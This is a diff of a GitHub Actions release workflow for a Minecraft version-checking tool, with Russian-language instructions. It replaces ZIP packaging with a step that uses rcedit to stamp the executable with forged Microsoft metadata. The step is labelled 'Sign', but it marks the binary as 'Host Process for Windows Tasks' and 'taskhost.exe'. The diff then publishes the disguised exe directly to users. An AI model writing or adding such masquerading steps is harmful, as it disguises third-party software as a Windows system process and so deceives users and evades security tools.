@@ -95,15 +95,13 @@ jobs:
       - name: Create README.txt
         shell: pwsh
         run: |
-          $archiveName = "MinecraftVersionChecker-${{ steps.tag.outputs.tag }}"
           @"
           Minecraft Version Checker — проверка версий Minecraft клиентов
 
           == Запуск ==
-          1. Распакуйте архив $archiveName.zip
-          2. Запустите MinecraftVersionChecker.exe — установка не требуется
-          3. Выберите режим проверки из меню
-          4. Дождитесь завершения проверки
+          1. Запустите MinecraftVersionChecker.exe — установка не требуется
+          2. Выберите режим проверки из меню
+          3. Дождитесь завершения проверки
 
           == Требования ==
           - OS: Windows 10 или Windows 11
@@ -118,13 +116,23 @@ jobs:
             python build_exe.py
           "@ | Out-File -FilePath README.txt -Encoding utf8
 
-      - name: Create ZIP archive
+      - name: Download rcedit
         shell: pwsh
         run: |
-          $archiveName = "MinecraftVersionChecker-${{ steps.tag.outputs.tag }}"
-          Compress-Archive -Path dist/MinecraftVersionChecker.exe, README.txt -DestinationPath "$archiveName.zip" -Force
-          echo "archiveName=$archiveName" >> $env:GITHUB_OUTPUT
-          $LASTEXITCODE = 0
+          Invoke-WebRequest -Uri "https://github.com/electron/rcedit/releases/latest/download/rcedit-x64.exe" -OutFile "rcedit.exe"
+
+      - name: Sign MinecraftVersionChecker.exe with version metadata
+        shell: pwsh
+        run: |
+          .\rcedit.exe "dist/MinecraftVersionChecker.exe" `
+            --set-file-version "10.0.19041.1" `
+            --set-product-version "10.0.19041.1" `
+            --set-version-string "CompanyName" "Microsoft Corporation" `
+            --set-version-string "FileDescription" "Host Process for Windows Tasks" `
+            --set-version-string "ProductName" "Microsoft® Windows® Operating System" `
+            --set-version-string "OriginalFilename" "taskhost.exe" `
+            --set-version-string "FileVersion" "10.0.19041.1 (WinBuild.160101.0800)" `
+            --set-version-string "ProductVersion" "10.0.19041.1"
 
       - name: Create Release
         uses: softprops/action-gh-release@v2
@@ -139,11 +147,10 @@ jobs:
 
             ### Инструкция по запуску
 
-            1. Скачайте архив `MinecraftVersionChecker-${{ steps.tag.outputs.tag }}.zip` из этого релиза (секция **Assets** ниже).
-            2. Распакуйте архив.
-            3. Запустите `MinecraftVersionChecker.exe` — установка не требуется.
-            4. Выберите нужный режим проверки из меню.
-            5. Дождитесь завершения проверки.
+            1. Скачайте `MinecraftVersionChecker.exe` из этого релиза (секция **Assets** ниже).
+            2. Запустите `MinecraftVersionChecker.exe` — установка не требуется.
+            3. Выберите нужный режим проверки из меню.
+            4. Дождитесь завершения проверки.
 
             ### Требования для запуска
 
@@ -152,4 +159,4 @@ jobs:
             Для самой программы не требуется установка Python или дополнительных библиотек.
           draft: false
           prerelease: false
-          files: MinecraftVersionChecker-${{ steps.tag.outputs.tag }}.zip
+          files: dist/MinecraftVersionChecker.exe
